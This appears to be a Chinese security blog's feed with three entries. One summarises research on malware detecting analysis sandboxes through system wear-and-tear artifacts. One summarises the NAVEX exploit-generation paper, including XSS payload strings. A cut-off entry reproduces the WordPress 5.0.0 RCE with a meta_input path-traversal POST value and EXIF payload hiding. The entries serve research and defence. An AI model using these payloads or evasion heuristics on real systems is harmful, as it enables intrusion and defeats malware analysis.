Tools）和注册表项等 防御者D: 配置动态分析系统时以避免出现期望值和配置 攻击者A: 这对虚拟化指令的时序属性、运行时使用小代码片段等底层属性作用不大 B. Environmental and User Interaction Artifacts防御者D: 我的两种方案: 在多个不同的分析系统上运行每个样本来检测恶意软件的“分裂个性”； 避免完全使用仿真或虚拟化，并选择“裸机”系统来保持分析环境的真实性。 攻击者A: 目前虚拟化技术的广泛使用，应当认为VM和非VM是具有同样的感染价值的，从而减少对VM检测技巧的使用，转而采取如下几种启发式方法: 检查鼠标光标是否在屏幕中央保持静止； 是否存在“最近打开文件”； 异常低数量的进程； 不受限制的互联网连接，并尝试解析已知的不存在的域名(比如WannaCry)。 防御者D: 我的两种对策: 模拟用户行为； 暴露更真实的网络环境 防御者D对策的缺陷: 系统正常使用而预计会发生磨损和老化特征未被考虑。 C. Sandbox FingerprintingSandFinger: 使用移动设备属性来作为沙箱指纹来规避Google的Bouncer沙箱。 AVLeak: 使用侧信道的方式捕获AV引擎中的指纹。 SandPrint: 提取Windows沙箱中的硬件配置参数，恶意软件样本调用机制的特征，可执行文件的文件名等特征进行聚类分析，进而识别沙箱。 如果沙箱操作员将沙箱的特征值进行多样化处理，致使是指纹失效。那么攻击者下一步会考虑怎么方法进行规避? 这种方式就是本文中所提到的真实系统才具有的“磨损”和“老化”特征。 III. WEAR AND TEAR ARTIFACTS文中选用的artifact的特点: 恶意软件可以轻松探测 artifact的选择策略: 哪些在系统的正常使用中会被影响 A. Probing for Artifacts while Preserving User Privacy从artifact地选择上来看可以分为两种:一种是直接源于用户活动；另一种是来自系统活动(用户活动的间接表现)。 直接来源是针对用户行为的定性指标： 文档文件夹是否包含具有预期文件扩展名的合理数量的文件； 检查流行文档查看应用程序中最近打开的文档； 最近键入的在线搜索引擎查询； 系统范围的搜索查询 即时消息； 电子邮件消息内容但是这些将会对用户的隐私造成侵犯，所以本文的方案将使用间接来源(比如:统计cookie、访问的URL数量等方式) B. Artifact Categories本文主要针对Windows操作系统进行研究，所以采用的artifact类别集合如下表所示: IV. DATA COLLECTIONA. Probe Tool Implementation为了从真实用户系统和恶意软件沙箱中收集以上类别的artifact数据集，作者实现了一个只使用系统API、不需要安装并且兼容Windows XP到Windows 10的探针程序。这个程序主要有以下几个特点: 使用HTTPS信道传输收集到的artifact数据防止沙箱拦截请求； 收集一些BIOS供应商等其他信息用于VM启发式检测，来去除用户集中可能存在的VM结果集； 唯一的嵌入式ID来识别同一供应商的多次提交(一些砂箱会将程序放在多个不同的环境中进行动态分析，进而检测其行为)； 基于操作系统安装日期，Windows版本，BIOS供应商等信息的组合来区分不同的操作系统。 B. IRB Approval and User Involvement这部分主要讲述作者在申请IRB批准，从而让真实用户参与进这个项目中。 C. Data Collection第一个数据集（Dreal）-&gt; 270个真实用户机器，其中有89.4％是Amazon Mechanical Turk workers。国家分布为美国（44％），印度（18％），GB（10％），CA（8％），NL（1％），PK （1％），RU（1％）和其他28个频率低于1％的国家/地区(这种国家分析代表了从发达国家到发展中国家的计算机使用磨损特性)。表II中显示了用户系统的BIOS供应商分布。 PS:后面作者发现Amazon Mechanical Turk workers是一种跟搜索引擎相结合的沙箱，因此将这一部分的数据标记为“crawlers”并合并到后面的沙箱数据集中。 第二个数据集（Dsand）-&gt; 来自15个可以收集到信息的恶意软件沙箱，表III是沙箱与对应探针回收的信息。 PS:有的沙箱环境会在底层使用不同版本的操作系统来分别进行分析。 第三个数据集（Dbase）-&gt; 基准数据集，数据来自多个全新安装的Microsoft Windows版本(包括Azure和AWS提供的云Windows服务器)。 D. Dataset Statistics表IV显示了我们三个收集的数据集中不同Microsoft Windows版本的数量。(可以看出沙箱的系统分布与真实用户的是不相同的)。 图1显示了三个数据集（Dreal，Dsand和Dbase）中每个磨损artifact值的分布。从中可以看到:1.大多数artifact在真实用户系统中的值大于沙箱和基线中的值，因此可以用来区分真实用户和沙箱；2.真实用户的artifact值分布更宽，因此可以用来预测系统年龄。 PS: 可以看到沙箱的appdiffdays和sysdiffdays值比真实用户高很多，因此沙箱系统一般比真实用户系统“老化”程度更高。 图2显示了Mann-Whitney U检验显示的Dreal和Dsand分布之间差异的影响大小。0.3和0.5之间的效果被认为是“中等”效应的特征，而高于0.5的效应被认为是“强”效应。 V. EVADING MALWARE SANDBOXES以上的统计信息说明了作者所选用的artifact是可以作为特征来分辨沙箱的，因此接下来将使用有监督机器学习方式，训练决策树模型来进一步完成对沙箱的规避工作。 A. Setup and Classifier 使用决策树模型。因为决策树模型可以表现为一系列的if-else语句，从而将恶意软件的整体足迹保持在最小。 计算皮尔森相关系数（r）来检查特征对的相关性。虽然有4对特征具有很强的相关性（r&gt; 0.7），但是为了尽可能的规避所有沙箱，作者还是采用了所有的特征。 训练集：49个沙箱环境实例，22个新安装操作系统的实例，71个真实用户实例；测试集：剩余的49个沙箱环境实例，49个真实用户随机样本。 使用10-trial adaptive boosting算法(创建多个树，每个树专注改进前一棵树的结果)和adaptive boosting决策树算法(覆盖单棵树不能到达的边界)来提升分类器准确性。 指定成本矩阵减少漏报的出现(原则是宁可不感染到某些真实用户，也尽量不能被沙箱捕获)。 PS: FP 误报-&gt;没有感染真实用户主机；FN 漏报-&gt;尝试感染沙箱 B. Evaluation模型在测试集上达到了92.86％的准确率，假阴性率（FNR）为4.08％，假阳性率（FPR）为10.20％。 十个构建的树的平均树大小为4.6分裂，最短的树具有3个分裂，最长的树分裂为5个。 表V显示了对算法最有用的功能，以及使用任何给定功能的树的百分比。 之后作者从两个思路出发:一、评估我们的算法对沙盒环境中增量变化的稳健性方法: 每次只删除一个特征，将以上分类器训练过程重复30次。目的: 对于攻击者而言量化恶意软件区分沙箱和真实用户的能力；对于防御者而言可以使用在此处识别的最有价值的artifact磨损程度来模仿真实的用户系统。效果: 图4显示了准确性，误报率和漏报率如何变化。可以看到即使删除多达20个特征，分类器的整体准确性仍高于90%。 二、每种类型的工件如何影响分类器的准确性方法: 一次仅使用一种类型的工件重新训练我们的模型。目的: 让恶意软件作者可以选择他们想要关注的artifact类别，但这种选择不会影响恶意软件的规避能力。效果: 表VI显示了每个类别的artifact数量以及每个分类器在测试数据集上的性能。 VI. ESTIMATING ACTUAL SYSTEM AGE在之前的数据分析中，可以发现沙箱环境的“老化”程度与用户的真实环境是截然不同的。而且理论上“磨损”程度和“老化”程度应该是相匹配的，如果不匹配那么是沙箱的概率则很大。对于攻击者可以使用者一特点进行沙箱规避；对于防御者则可以对沙箱做更好的调整。 A. Correlation Between Age and Artifacts目的: 得出artifact的磨损与系统年龄之间的关系 图5显示了用户系统和恶意软件沙箱“年龄”的累积分布函数。可以看到平均而言用户系统比沙箱更“新”。 图6显示了报告的年龄与真实用户系统的每个artifact磨损程度之间的皮尔森相关系数。此处假设从真实用户系统收集的报告年龄是准确的。 观测结果分析: 许多非常成功地区分真实机器和沙箱的工件实际上与机器的年龄无关； 一些与用户活动直接相关的artifact不能很好的反映系统的年龄，比如cookie的数量(用户可以主动清除)； 一些不太容易被用户修改的artifact将跟系统年龄成正相关，比如连接过的USB数量。 B. Regression目的: 确定组合它们的原始值来估计系统的实际年龄的合适方法。数据集处理: 删除具有缺失值的artifact； 删除丢失率超过80％的artifact。 (1) Linear Regression: 公式: Y =β0+β1X1+β2X2+ … +ε (Xi是给定的artifact值，βi是对应的权重，Y是预测的年龄) 数据集: 训练（60％），测试（40％） 评估: 十折交叉验证 结果: 真实系统的预测年龄的最终均方误差（MSE）是1.88，而沙箱的MSE非常高，为6.25。 结论: 使用artifact的磨损程度来预测系统年龄是可行的，也就是说使用预测年龄和系统的生成年龄的对比来识别沙箱是可行的。 PS: 十折交叉验证，英文名叫做10-fold cross-validation，用来测试算法准确性。是常用的测试方法。将数据集分成十份，轮流将其中9份作为训练数据，1份作为测试数据，进行试验。 表VII中报告了模型的系数及其p值。 我们看到13种artifact磨损程度与机器的年龄相关，具有统计学意义。 图7显示了在Dreal和Dsand系统上应用线性回归模型时残差值的累积分布函数(CDF)。可以看到在尝试预测沙箱年龄时的残差值是非常高的。 (2) Lasso Regression 目的: 验证复杂的回归模型是否会带来更好的预测准确性 套索回归的优点: 比线性回归使用更少的预测变量，这降低了整体模型的复杂性。 对于恶意软件，较小的功能集意味着对底层操作系统的API调用较少，从而减少了触发可疑活动监视器的机会。 数据集: 训练集，评估集和测试集 方法: 交叉验证来找到最佳的λ值 结果: Dreal集的MSE为0.749，Dsand集上的MSE为4.45，优于线性回归 结论: Lasso模型可以更好地辨别沙箱。 表VIII显示了Lasso模型选择的八个特征，它们是系统年龄及其相应系数的良好预测因子。 小结: 使用artifact磨损程度来预测系统年龄是可行的，这一方面可以用于辨识沙箱；另一方面是可以帮助sandbox开发人员创建系统年龄相符的沙箱环境 VII. DISCUSSIONA. Ethical Considerations and Coordinated Disclosure本文主要讲述了这种新的规避技术的有效性，并且目前已经出现了此类相关工作的恶意软件。但是本文主要是为了帮助创建更强大的恶意软件分析系统。 B. Probing Stealthiness1.总是存在不受监控的artifact集；2.虽然最小特权原则造成的系统API调用限制，可访问的环境限制，但是依旧可以从其他不受限制的artifact集获取大量信息； C. OS Dependability文章虽然是基于Windows平台在进行artifact的分析，但其中的一些artifact并不是其特有的，在其它系统例如Linux，Mac，Android等也同样适用。如果想适用Java等编写跨平台的恶意软件，就可以去关注那些不依赖于特定系统而存在的artifact。 D. Defenses 克隆真实用户系统并将其用作恶意软件沙箱的基础。缺点:i) 隐私问题（如何在克隆之前或之后擦除所有私人信息，但保留磨损工件完整？）；ii) artifact的老化问题(攻击者可以使用我们提出的统计模型来检测声称的年龄与磨损程度不匹配的情况)。 从新安装的操作系统映像开始，通过自动模拟用户操作人为地使其老化。缺点:尚不清楚这种人工老化在多大程度上会产生与真实系统相似的artifact情况。 VIII. CONCLUSION AND FUTURE WORK本文主要做了两个方面工作: 攻击者角度:将Windows系统的一些不涉及用户隐私的artifact作为特征，使用决策树分类器进行训练，最终可以在92.86％的准确度上来识别沙箱环境。 防御者角度:将系统的artifact特征与系统的年龄进行联系并提出统计模型，从而帮助沙箱操作人员对系统进行微调，使其具有更逼真的磨损特性。 未来工作: 克隆真实用户系统并将其用作恶意软件沙箱的基础。 自动模拟用户操作人为地使系统其老化到所需程度。 不同的桌面操作系统以及移动设备中评估基于artifact磨损特性的沙盒规避的有效性。 PS: 本文技术仅供研究参考，请勿利用本文技术施行攻击行为。]]></content>
  </entry>
  <entry>
    <title><![CDATA[NAVEX->Precise and Scalable Exploit Generation for Dynamic Web Applications]]></title>
    <url>%2F2019%2F03%2F11%2FNAVEX-Precise-and-Scalable-Exploit-Generation-for-Dynamic-Web-Applications%2F</url>
    <content type="text"><![CDATA[出处：27th USENIX Security Symposium作者：Abeer Alhuzali, Rigel Gjomemo, Birhanu Eshete, and V.N.单位：Venkatakrishnan University of Illinois at Chicago资料：Paper | Github 1. Abstract &amp; Introduction作者在本文中提出了一种以静态分析作为指导，结合动态分析自动验证漏洞并构造可用exploit的工具NAVEX。 研究问题： 解决以往自动化审计的误报以及必须结合人工参与构造Exp的问题； 静态分析虽然覆盖率高，但是对于具有动态特性的语言其建模困难。 解决方案： 静态分析阶段：使用符号执行创建Web应用程序的各个模块的行为模型。标记出包含潜在漏洞点的模块； 动态分析阶段：使用Web爬虫和concolic执行器去发现可能导致攻击者进入易受攻击模块的可能的HTTP导航路径，之后使用约束求解器生成一组对漏洞进行利用的HTTP输入序列。 方案优点： 动态分析与静态分析相结合提升了性能，可以应用于大型应用程序； 是一种多类型漏洞的Exp生成框架。 NAVEX分析了320万行PHP代码，自动构建并利用204个漏洞，其中有195个与SQLI和XSS相关，而9个与逻辑漏洞相关。此外NAVEX是第一个可以自动发现并利用EAR漏洞的方案。 2 Challenges and Approach Overview2.1 Running Example下面是一个包含漏洞的小型Web程序。selectBooks.php模块在第23-38行使用了Web表单来实现选择数据，其中在23行调用了JavaScript来验证数输入，相关定义在第31-36行。第4-12行实现用户输入由服务器端代码进一步验证和过滤。之后第17行通过MySQL查询来验证书籍的可用性。最后根据查询结果，初始化$_SESSION[&#39;ISBN&#39;]并在浏览器上打印到hold.php的HTTP链接。 之后跳转到hold.php执行附加检查，如果满足，则HTTP链接引导用户进入下一步（第7行）。 单击链接时，将设置超全局$_GET [&#39;step&#39;]，从而让hold.php包含模块checkout.php并执行。 checkout.php通过向用户提供链接（第19行）进行确认来完成借用过程。 该链接设置两个超全局变量（$_GET[&#39;step&#39;]和$_GET[&#39;msg&#39;]），将在第6行进行检验。最后，调用确认功能（第13行）以通知用户该书已成功保留。 该程序存在以下几点缺陷： selectBooks.php:17中$publisher经过简单校验就传入SQL语句进行拼接，可造成SQLi漏洞(str_place函数进行了无效过滤)； checkout.php:15行使用了echo，可能会造成XSS； selectBooks.php:3行调用header但是没有使用exit()，造成EAR漏洞进而可以在不进行登录的情况下触发下面的SQLi漏洞。 2.2 Challenges面临的挑战主要是以下三点： 污点可达性：对于WebApp而言，完成一个功能往往是各模块相关联的。此外，模块中往往还使用内置函数过滤(比如htmlspecialchars)、隐式过滤(比如类型转换)、自定义过滤和数据库约束条件带来的过滤来消除风险。所以攻击路径的寻找是具有一定难度的。 动态特征：静态分析对于动态程序的分析具有局限性，比如无法推断动态将会生成怎样的表单或者链接(比如使用JavaScript来生成的内容)。 扩展性：对大型程序的分析会覆盖客户端，服务器端和数据库后端，因而会产生很多路径，必须使用一些方法来减少一些无用的路径。(之所以叫扩展性应该是跟后面的COG图的扩展有关) 2.3 Approach Overview方法主要分为两个步骤： 可能的漏洞点识别。首先，定位程序中可能的漏洞点以及对应的模块(这样减少后面的搜索空间)；其次，对各种过滤方案进行了精确表示；最后，对自定义的过滤先使用符号约束构建模型之后使用约束求解器来判断过滤的稳健性。 具体的漏洞利用生成。首先，动态执行得到Web应用程序的导航结构；其次，结合静态分析得到的漏洞点和对应的模块寻找可行的攻击路径；最后，多次重复动态执行，使用约束求解最大化路径覆盖。 3 Architecture and Algorithms3.1 Vulnerable Sink Identification目的：排除那些不包含漏洞点的模块方法：如下图，首先，构建每个模块代码的图模型；然后，发现包含源和目标(漏洞点)之间数据流的路径；最后，使用符号执行生成公式后利用约束求解以确定哪些路径可能被利用。 3.1.1 Attack Dictionary多种漏洞被触发的过程是相似的–均是攻击载荷到达敏感接收器进而触发漏洞，所以NAVEX使用这种相似性构建了一个包含Sinks(敏感接收器)、Sanitizations(过滤函数)、遍历类型(前向遍历还是反向遍历)和攻击字符串(其实就是收集的WebFuzz字典)的攻击字典来实例化针对每类漏洞的分析。字典包含：SQLI，XSS，文件包含，命令注入，代码执行和EAR漏洞。 3.1.2 Graph Construction代码属性图（CPG）是一种结合了抽象语法树（AST），控制流图（CFG），调用图和数据依赖图（DDG）的表示。此处，将过滤标签和数据库约束标记作为属性添加到CPG，从而对其进行扩展。最终将漏洞发现问题转变为对CPG图的遍历问题。 3.1.3 Graph Traversal此步骤的目的是通过对扩展后CPG来寻找攻击路径，主要分为向后遍历和向前遍历。向后遍历的算法如下图所示。正向遍历则主要是从源到可能漏洞点的路径搜索，这种搜索方式也是对EAR漏洞的重要检测方法。(文中提到了良性EAR–header之后不含可利用点和恶性EAR–header之后包含可利用点)。图遍历最终将会返回一组可能容易受到攻击的路径供下一步使用。 3.1.4 Exploit String Generation利用上一步发现的攻击路径来生成攻击字符串是静态分析的最后一步。首选构造增广公式 Fpath∧Fdb∧Fattack(Fpath是易受攻击的路径；Fdb是从DB标记派生的约束；Fattack是针对漏洞点的可控变量的，其值来源于之前构造的攻击字典)。之后使用求解器求出一组解(解就是是攻击字符串传入可控变量后在易受攻击的路径上经过过滤到达漏洞点依旧可以造成危害)。到此静态分析过程结束，之后的过程是通过动态分析得到攻击字符串到达攻击点的HTTP请求序列。 3.2 Concrete Exploit GenerationNAVEX执行几个步骤来生成具体的Exp，如下图所示。首先，创建导航图来发现所有执行应用程序模块的可能HTTP请求序列；之后，结合静态分析阶段得到的可能漏洞点来筛选对应模块的执行路径；最终，生成可用的Exp。 3.2.1 Dynamic ExecutionNAVEX使用动态执行方法，借助约束求解和concolic执行来生成大量表单输入，以帮助爬虫最大化应用程序的覆盖范围。 爬虫(解决客户端约束条件)：使用种子URL启动，可以对Web站点的每个角色自动化登录验证，采用广度优先遍历算法，新抓取的URL将作为下一次的爬虫的起始。此处的优点在于，首先，爬虫可以构造符合JavaScript验证的输入；其次，有效表单输入的自动生成提高了覆盖范围。 自动有效输入构造：NAVEX结合了表单HTML约束Fhtml和JavaScript约束Fjs来生成最终形式约束Fform，之后使用求解器来求解，最终得到对应的HTTP请求。示例如下： 123456// 约束公式Fhtml : (book_name=="Intro to CS by author1" ∨ book_name=="Intro to Math by author2")Fjs: edition &gt; 0Fform: Fhtml ∧ Fjs// 求解得到的HTTP请求http:.../selectBooks.php?action=borrow POST[book name=Intro to CS by author1, edition=2] 解决服务器端约束：在服务端也会对输入有一定的约束，所以在满足前端约束后必须判断服务端约束是否也同时得到了满足。为解决这个问题，NAVEX会动态跟踪判断信息是否满足服务端约束，主要根据以下两点信息：(i)更改其状态（即，创建新会话，设置新变量和超全局值等）;(ii)执行敏感操作来确定请求是否成功，比如查询数据库等。如果检测到请求没有成功执行，那么将会concolic执行依据服务端程序逻辑得出约束公式并对之前发现的执行路径进行更新，之后使用求解器求解生成新的表单数据进行提交(在成功之前会一直执行这个过程)。服务端约束示例如下： 1(book name==&quot;intro to CS by author1&quot; ∨ book name==&quot;intro to Math by author2&quot;) ∧ length(publisher)&lt;=35 ∧ edition &gt;0 PS：NAVEX会存储导致成功提交的完整HTTP请求。 3.2.2 Navigation Graph导航图是一个有向图G=(N,E)，其中每个节点n∈N表示HTTP请求.每个边e=(ni,nj)∈E表示从ni到nj的导航，表示发起d的请求，可以是链接形式。图中的每个节点都具有以下属性id，URL，role和form params，用于表示表单提交生成的HTTP请求。id属性存储节点的唯一标识符，URL属性是HTTP请求中的URL，它由请求的模块名称和HTTP参数组成，role属性包含爬虫使用的登录凭证。示例图如下： 3.2.3 Final Exploit Generation静态分析：扩展的CPG图和Exp字符串。动态分析：NG导航图。如何将这个两个信息进行组合并产生Exp就是此步的作用。优点：将漏洞Exp的构造问题转换为对图的简单搜索问题。难点：文件被包含这个过程在NG中是看不到的。难点解决：预处理包含解析，此步骤创建存储文件包含关系的包含映射。通过执行遍历来构造映射，该遍历在增强的CPG中搜索表示对文件包含PHP函数的调用的节点，最终将得到包含图。之后使用NG和包含图来搜索公共模块到存在漏洞模块的路径，具体算法见下图： 依据Figure4我们使用算法得到的序列如下： 123456781. http://localhost/App/index.php2. http://localhost/App/selectBooks.php with POST params:[book name=intro to CS by author1, edition=2,publisher=aaaaaaa]3. http://localhost/App/selectBooks.php?action=borrow4. http://localhost/App/hold.php5. http://localhost/App/hold.php?step=checkout6. http://localhost/App/hold.php?step=checkout&amp;msg=&lt;script&gt;alert(”XSS”);&lt;/script&gt; 4 ImplementationNAVEX基于现有的几种工具进行实现： 扩展的CPG图利用phpjoern进行实现； 扩展的CPG图存储在Neo4j图形数据库中； 图遍历算法使用Apache TinkerPop编写； 约束求解使用z3以及其扩展Z3-str； 爬虫程序使用被约束和z3断言扩展的crawler4j； 爬虫对JavaScript的处理使用了Narcissus JavaScript引擎的扩展； 服务端代码执行跟踪使用Xdebug。 5 Evaluation数据集：26个真实PHP应用程序，代码库组合为3.2M SLOC和22.7K PHP文件如下表所示。标准：(i) 评估最流行应用的最新版本，并且要求是复杂且大型的PHP应用程序，如Joomla，HotCRP和WordPress；(ii) 使用NAVEX与已有的一些先进项目(例如，Chainsaw，RIPS)进行比较。 部署：实验环境：Ubuntu 12.04 LTS VM，2核2.4GHz，40GB RAM。目标WebApp部署：(1)进行静态分析；(2)部署后进行动态分析(注意每次爬虫后要恢复数据库初始状态) 结果摘要。 NAVEX共构建了204个漏洞exp，其中195个注入类型，9个是逻辑漏洞。 增强的CPG平均将假阳性（FP）减少了87％。包含用于构建导航图的客户端代码分析将Exp生成的精度平均提高了54％。 在评估集上，NAVEX能够进行6个HTTP请求来拼接出Exp。 增强的代码属性图统计：表2显示了增强的CPG构建时间和大小，可以看出NAVEX的运行时开销很低。 导航图统计：表3总结了在NAVEX的步骤II中生成漏洞Exp的总时间。 以上是综述，下面将阐述作者从四个方面对NAVEX的评估：1.Exploits；2.定量分析；3.与相关工作的比较；4.限制和讨论 5.1 Exploits接下来作者将对NAVEX针对的漏洞逐一简要说明： SQLI漏洞：漏洞触发点：mssql_query, mysql_query, mysqli_query,sqlite_query漏洞定位：155个SQLI可利用的漏洞点，其运行时间为37分和45秒。Exp生成：105个SQLI漏洞利用Exp，其运行时间为7分和76秒。 SQLI漏洞利用： XSS漏洞：漏洞触发点：echo、print漏洞定位：1小时49分钟内共发现了133个XSS可利用的漏洞点，其中5个是误报Exp生成：40分12秒为133个漏洞点生成了90个XSS漏洞利用 XSS漏洞利用：如下所示包含strtr函数的路径会被认为是可被攻击的，但是htmlspecialchars的就不会，因为strtr函数对XSS的过滤能力很弱，之后求解器会选择%26%2339%3B-alert(1)-%26%2339%3B来进行绕过。 EAR漏洞：漏洞触发点：header漏洞定位：17分17秒内发现了19个良性EAR和3个恶意EAR漏洞Exp生成：成功针对22个EAR漏洞生成了9个漏洞利用 代码执行漏洞：漏洞触发点：eval漏洞定位：在21m20sec内找到98次调用但是均无安全缺陷 命令注入漏洞:漏洞触发点：exec,expect_popen,passthru,pcntl_exec,popen,proc_open,shell_exec,system,mail,backtick_operator漏洞定位：在22m32sec内NAVEX没有找到任何易受影响的漏洞点 文件包含漏洞：漏洞触发点：include,include_once,require,require_once漏洞定位：在27分58秒内找到1处接收器内包含了可控变量但是因为后面有约束所以无法构造出Exp，即此处依旧不可利用 5.2 Measurements 图5显示了NAVEX的性能(定位漏洞点的耗时和构造Exp的耗时) 图6显示使用了过滤和DB标签增强的CPG对可能漏洞点判别的影响。(减少了误报) 总覆盖率为68％ 对客户端代码进行分析带来的好处：提升了精度和覆盖率 5.3 Comparison with Related Work 漏洞检测方面与RIPS，Chainsaw的对比； Exp生成与Chainsaw(只能够对SQLi和XSS生成Exp)的对比； 效率方面与Chainsaw的对比： 生成Exp: NAVEX-&gt;25分钟2秒；Chainsaw-&gt;112分钟前期准备: NAVEX-&gt;18分26秒；Chainsaw-&gt;1天13小时21分 5.4 Limitations and Discussion Web应用程序的某些功能尚不受支持，比如文件上传逻辑； 自动从图节点导出的TAC公式不完整(未提及哪些不支持)； 静态分析进行漏洞定位存在误报； CPG图不支持解析动态函数调用(文中说这个不太重要但未具体说明，可能是使用极少)； 如果网站的动态逻辑不被NAVEX支持，那么将无法构造漏洞利用(比如前面的SchoolMate程序的会话维持未被支持&lt;-笔者从文中得到的信息) 6 Related Work详细见论文中表述 7 ConclusionsPS: 此部分是一些笔者个人的总结并非论文的最终总结 之前对PHP漏洞的自动化审计工作主要分为静态分析和动态分析。其中静态分析的一些代表的可实际使用的工具有rips、cobra、Cobra-W以及seay代码审计系统，其中rips的建模分析以及攻击字典的构造是比较详细和全面的。虽然可以参考其代码和论文进行学习，但是开源版对现在而言已经不具有实用价值。cobra是基于AST进行分析，AST是具有一定的局限性的，从分析效果上而言没有控制流图好，当然也没有今天提到的CPG好。但是cobra在AST上建立的分析模型以及他对规则集的引入方式是具有一定参考性的。当然在cobra之后的Cobra-W是令人眼前一亮的感觉，虽然还未完全开发完成，但是它对文件包含的处理以及对于自定义过滤函数的处理思想是很值得学习的(相比rips的暴力直接将代码拼接好一些)。seay代码审计系统的优点就是其中包含了对数据库的审计。其它的还有phpvulhunter等工具，但是年代较为久远因而笔者没有对其代码做进一步的分析。在分析过上面的程序之后笔者也曾在一年前尝试引入别名分析等新机制来进一步改善静态分析的准确率，但是效果不是很理想随后就弃坑了。动态分析最具代表性的是prvd，这个笔者还未进行分析，但是用效果不错，感兴趣可以对其进行进一步的分析。 最后回到本文，此文提出的NAVEX采用静态分析和动态分析相结合的方式，可以自动完成对漏洞的分析并生成Exp。在文中提到的几个方法都是非常新颖的，从效果上来看很不错。如果从工程的角度来看，完全可以借鉴其思想从而进行深入的开发完善。]]></content>
  </entry>
  <entry>
    <title><![CDATA[wordpress 5.0.0 RCE分析与复现]]></title>
    <url>%2F2019%2F03%2F06%2Fwordpress-5-0-0-rce-aanalysis%2F</url>
    <content type="text"><![CDATA[0x00 概述RIPS于2月20日在博客上披露了一个关于WordPress 5.0.0的远程代码执行漏洞。此漏洞由Post Meta变量覆盖、目录穿越写文件、模板包含组合后构成远程代码执行漏洞。 1.漏洞触发条件（1）存在漏洞的wordpress版本如下：WordPress commit \&lt;= 43bdb0e193955145a5ab1137890bb798bce5f0d2 （WordPress 5.1-alpha-44280）（2）需要作者权限的账号 2.漏洞的影响范围受影响的wordpress版本为：1.WordPress 5.1-alpha-44280更新后2.未更新的4.9.9~5.0.0的WordPress服务端：windows、linux、mac图片处理库：gd/imagick 0x01 环境配置wordpress在某个版本以后，就增加了自动升级小版本的功能。所以安装好wp以后，需要手工在wp-config.php中加个define(&#39;AUTOMATIC_UPDATER_DISABLED&#39;,true);，禁止其自动更新。 代码下载最好到对应的wordpress网站下载，因为官方github release版本都被patch了。此处的分析采用的是从wordpress中文网下载的4.9.4版本代码。 本文的环境搭建：macOS+php7+wordpress4.9.4+imagick6.9.7 0x02 漏洞分析1.Post Meta变量覆盖此处的漏洞点出现在wordpress 媒体功能在更新被编辑的图片处，我们上传图片之后，图片的保存路径是wp-content/uploads/years/month，同时会在数据库的wp_postmeta表中_wp_attached_file和_wp_attachment_metadata插入对应的值，第一个值是图片的路径+图片名，第二个是图片的相关信息被序列化后的值，具体信息如下图所示。接下来我们定位到此处的漏洞点，在编辑并更新图片的时候会调用edit_post()函数，wp-admin/includes/post.php:187从中可以看到该方法的参数来自$_POST,并且此处也没有任何的过滤，在赋值给$post_data之后，被带入到wp_update_post()函数。我们动态调试跟一下这个函数的调用栈。首先我们直接让程序运行到update_post_meta()这个函数，这个函数根据$post_ID修改post meta field，接着调用update_metadata()更新meta数据，完成之后更新post数据。但是在此处并没有对post的数据进行过滤，我们的$post_data[&quot;meta_input&quot;][&quot;_wp_attached_file&quot;]的值也没有被过滤掉。我们继续跟进wp_update_post()函数，点击步进后进入wp_update_post()函数，wp-includes/post.php:3611我们可以看到在这个函数的末尾处，如果post_type的值是attachment类型就会调用wp_insert_attachment()函数，wp-includes/post.php:4898。我们继续步进跟一下这个函数，可以看到它接着调用了wp_insert_post()函数，wp-includes/post.php:3044在第3434行可以看到对于meta_input参数，此处遍历传入update_post_meta()函数，我们继续跟进。update_post_meta()函数，wp-includes/post.php:1799发现其中调用了update_metadata()函数来做进一步的处理，跟进后发现update_metadata()使用来将数据库中对应的键值进行更新操作，而且在这个过程中没有对meta_input的值做任何的过滤，所以我们可以传入指定的 key 来设置它的值。在此我们回顾一下这个调用栈因此我们构造POST数据包就可以覆盖掉_wp_attached_file的值，覆盖效果及操作如下所示：12#将这个附加到POST数据后&amp;meta_input[_wp_attached_file]=2019/03/z3r0yu.jpg?/../../../../themes/z3r0yu.jpg 到此为止第处漏洞点的分析利用已经完成，漏洞触发最重要原因就是没有做好过滤，因此该处的补丁为：1array_diff_key( $post_data, array_flip( array( 'meta_input', 'file', 'guid' ) ) ); 从补丁上可以看到对meta_input做了过滤(PS:你下载的代码中要是出现这个就说明是被patch过了)。 2.目录穿越造成文件写入该问题是建立在之前我们Post Meta变量覆盖漏洞之上的。因为在之前我们是可以在_wp_attached_file处写入任意值的，因此只需要一个方法将我们写入的值进行利用一下就好。在wordpress的图片裁剪功能中，可以实现本地文件读取和远程文件读取。但是远程文件读取这个位置很有意思，如果目标图片在该目录不存在，则通过本地服务器下载该图片，如从http://127.0.0.1/wp494/wp-content/uploads/2019/03/2233.jpg下载，裁剪后重新保存。此处我们可以构造一个带参数的url，比如http://127.0.0.1/wp494/wp-content/uploads/2019/03/2233.jpg?z3r0yu，在远程读取的时候会忽略?号之后的内容，从而只对2233.jpg进行剪切后保存。目录穿越问题就存在于此，如果我们构造如下所示的urlhttp://127.0.0.1/wp494/wp-content/uploads/2019/03/2233.jpg?/../../../../themes/twentysixteen/z3r0yu.jpg，wordpress将裁减后的图片保存至wp-content/themes/twentysixteen/目录下，如果图片中包含恶意代码就可能被进一步的利用。 编辑图片会先调用do_action通过apply_filters()函数进入wp_ajax_crop_image()函数，在wp-admin/includes/ajax-actions.php:3224在函数中首先会调用check_ajax_referer()函数来对用户的权限进行校验，之后调用absint()函数将$_POST[&#39;cropDetails&#39;]的值转换为非负值，之后将参数传入wp_crop_image()函数对图片进行剪裁操作，wp-admin/includes/image.php:25。(PS:你如果想要动态调试经过这一步就要满足上面那些条件)从数据库取出_wp_attached_file后并没有任何过滤，所以我们之前设置的值在此处已经是完好的，如下图所示。只有依据_wp_attached_file的值做了判断，发现文件不存在开始去调用_load_image_to_edit_path()函数，我们进行跟进，wp-admin/includes/image.php:649继续跟进后发现调用了wp_get_attachment_url()来拼接url链接。之后上面拼接的url链接传输到wp_get_image_editor()函数中，我们步进跟一下这个函数，wp-includes/media.php:2900跟进后发现其中调用了_wp_image_editor_choose()函数，继续跟进，wp-includes/media.php:2950从这里可以看到Wordpress提供了两种方式来处理图片，优先使用Imagick，之后是GD。我们在此要特别注意，这俩对图片的处理方式是不同的： Imagick不会去除掉图片中的exif部分，所以我们可以将待执行payload代码加入到exif部分。 GD会去除图片的exif部分，并且其中的phpcode很难存活。除非通过精心构造一张图片才可以。 我在此只谈复现分析，暂时不谈对图片的Fuzz，因此选择Imagick库。 PS:Imagick处理类的load函数中调用的是readImage函数，但在高版本的Imagick上该函数不支持远程图片链接，因此最好采用Imagick-6.9.7及其以下版本。 